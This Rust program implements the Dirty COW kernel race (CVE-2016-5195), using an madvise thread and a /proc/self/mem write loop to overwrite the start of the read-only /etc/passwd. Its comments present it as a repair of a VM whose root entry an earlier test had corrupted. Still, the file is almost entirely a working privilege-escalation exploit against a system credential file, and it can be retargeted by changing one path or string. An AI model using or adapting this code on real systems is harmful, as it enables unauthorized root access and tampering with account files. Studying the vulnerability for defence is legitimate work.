use std::fs::OpenOptions;
use std::io::{Read, Seek, SeekFrom, Write};
use std::os::unix::io::AsRawFd;
use std::ptr;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};
use std::thread;
use std::time::{Duration, Instant};

fn main() -> std::io::Result<()> {
    // ---------------------------------------------------------------------
    // Purpose of this file
    // ---------------------------------------------------------------------
    // This is a Dirty COW repair/test payload.
    //
    // Dirty COW, CVE-2016-5195, is a race condition in the Linux kernel's
    // copy-on-write handling. The classic proof-of-concept pattern is:
    //
    //   1. Open a file read-only.
    //   2. mmap() it as a private read-only mapping.
    //   3. Repeatedly call madvise(..., MADV_DONTNEED) on the mapped page.
    //   4. Repeatedly write to the mapped address through /proc/self/mem.
    //
    // On vulnerable kernels, the write can incorrectly land in the underlying
    // file even though the process did not open that file with write access.
    //
    // In this specific VM, an earlier test overwrote the beginning of
    // /etc/passwd and changed:
    //
    //   root:x:0:0:root:/root:/bin/bash
    //   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    //
    // into something like:
    //
    //   newroot:x:0:0:root:/root:/bin/bash
    //   mon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    //
    // That broke sudo, because sudo expects a user literally called "root".
    // This payload tries to use the same Dirty COW write primitive to restore
    // the damaged prefix.

    // The file we are trying to repair.
    //
    // Important: this program opens the file read-only below. If the repair
    // succeeds, it is not because normal Unix permissions allowed the write;
    // it is because the kernel bug allowed the write-through.
    let target_path = "/etc/passwd";

    // The exact bytes to write at offset 0 of /etc/passwd.
    //
    // This string intentionally covers both:
    //   - the first line, changing "newroot" back to "root"
    //   - the start of the second line, changing "mon" back to "daemon"
    //
    // There is no final newline after "daemon" because we are patching only
    // the damaged prefix of the existing file. The rest of the daemon line is
    // already present after these bytes.
    let new_content = "root:x:0:0:root:/root:/bin/bash\ndaemon";

    // Open the target read-only.
    //
    // This is the point of the demo: a normal user should be able to read
    // /etc/passwd, but should not be able to write to it. We do not request
    // write permissions here.
    let file = OpenOptions::new()
        .read(true)
        .open(target_path)?;

    // Map the first new_content.len() bytes of the file into this process.
    //
    // PROT_READ means the mapping is readable.
    // MAP_PRIVATE means writes should normally go to a private copy-on-write
    // page, not to the original file on disk.
    //
    // The bug is that the madvise + /proc/self/mem race can confuse this
    // copy-on-write behaviour and allow writes to affect the backing file.
    let map = unsafe {
        libc::mmap(
            ptr::null_mut(),
            new_content.len(),
            libc::PROT_READ,
            libc::MAP_PRIVATE,
            file.as_raw_fd(),
            0,
        )
    };

    // mmap returns MAP_FAILED on error, not a Rust Result, so we need to check
    // it manually and convert the OS error into std::io::Error.
    if map == libc::MAP_FAILED {
        return Err(std::io::Error::last_os_error());
    }

    println!("Mapping established at {:p}", map);

    // Shared stop flag for both worker threads.
    //
    // Arc lets both threads own a reference to the same flag.
    // AtomicBool lets them read it without a mutex.
    // Ordering::Relaxed is enough here because this is only a simple
    // best-effort stop signal, not a correctness-critical data dependency.
    let running = Arc::new(AtomicBool::new(true));

    // Raw pointers are not Send, so pass the mapped address into the threads
    // as an integer and cast it back inside each thread.
    let map_usize = map as usize;
    let len = new_content.len();

    // ---------------------------------------------------------------------
    // Thread A: madvise loop
    // ---------------------------------------------------------------------
    // This repeatedly tells the kernel that the mapped page is no longer
    // needed. In normal behaviour, that should only discard our private COW
    // page. On vulnerable kernels, racing this with writes through
    // /proc/self/mem can make the write hit the original file.
    let running_madvise = running.clone();
    let madvise_thread = thread::spawn(move || {
        let map_ptr = map_usize as *mut libc::c_void;

        while running_madvise.load(Ordering::Relaxed) {
            unsafe {
                libc::madvise(map_ptr, len, libc::MADV_DONTNEED);
            }
        }
    });

    // ---------------------------------------------------------------------
    // Thread B: /proc/self/mem write loop
    // ---------------------------------------------------------------------
    // /proc/self/mem exposes this process's own virtual memory. The loop seeks
    // to the mmap'd address and writes the repair bytes there again and again.
    //
    // On a fixed kernel, this should not modify /etc/passwd.
    // On a vulnerable kernel, the race may cause the write to reach the
    // underlying file despite the file being opened read-only.
    let running_write = running.clone();
    let write_thread = thread::spawn(move || {
        let mut mem_file = OpenOptions::new()
            .read(true)
            .write(true)
            .open("/proc/self/mem")
            .expect("Failed to open /proc/self/mem");

        let buf = new_content.as_bytes();

        while running_write.load(Ordering::Relaxed) {
            // Seek to the mapped virtual address inside this process.
            mem_file.seek(SeekFrom::Start(map_usize as u64)).unwrap();

            // Ignore individual write failures. During the race, many writes
            // may fail or do nothing; success is checked by reading the target
            // file below.
            let _ = mem_file.write_all(buf);
        }
    });

    println!("Threads started. Attempting /etc/passwd repair for 10 seconds...");

    let start = Instant::now();

    // Poll the target file for up to 10 seconds so the program can stop on
    // its own instead of needing Ctrl+C every time.
    while start.elapsed() < Duration::from_secs(10) {
        let mut contents = String::new();

        if OpenOptions::new()
            .read(true)
            .open(target_path)?
            .read_to_string(&mut contents)
            .is_ok()
        {
            // Success condition: the file now begins with the repaired root
            // line and the repaired daemon line prefix.
            if contents.starts_with("root:x:0:0:root:/root:/bin/bash\ndaemon:") {
                println!("Success: /etc/passwd prefix repaired.");
                break;
            }
        }

        thread::sleep(Duration::from_millis(100));
    }

    // Tell both infinite loops to stop.
    running.store(false, Ordering::Relaxed);

    // Wait for the worker threads to exit before unmapping the memory.
    madvise_thread.join().unwrap();
    write_thread.join().unwrap();

    // Clean up the mmap'd region.
    unsafe {
        libc::munmap(map, len);
    }

    // Print only the first two lines, because they are the only repair target.
    let final_contents = std::fs::read_to_string(target_path)?;
    println!("Final /etc/passwd prefix:");
    for line in final_contents.lines().take(2) {
        println!("{}", line);
    }

    Ok(())
}